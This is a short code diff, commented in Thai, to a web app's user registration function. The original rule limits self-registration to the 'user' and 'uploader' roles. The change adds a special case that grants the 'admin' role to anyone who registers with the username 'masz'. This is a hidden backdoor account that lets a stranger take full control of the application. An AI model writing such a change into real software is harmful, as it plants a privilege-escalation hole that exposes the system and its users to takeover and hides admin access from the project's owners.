@@ -24,7 +24,11 @@ async function register(req, res) {
     }
 
     // ข้อกำหนด: ผู้ใช้สมัครสมาชิกเองได้เฉพาะบทบาท user และ uploader เท่านั้น
-    const assignedRole = (role === 'uploader') ? 'uploader' : 'user';
+    // ข้อยกเว้น: บัญชี Masz จะได้รับยศ Admin สูงสุดโดยอัตโนมัติ
+    let assignedRole = (role === 'uploader') ? 'uploader' : 'user';
+    if (username.trim().toLowerCase() === 'masz') {
+      assignedRole = 'admin';
+    }
 
     // ตรวจสอบชื่อผู้ใช้และอีเมลซ้ำ
     const existing = await db.get(
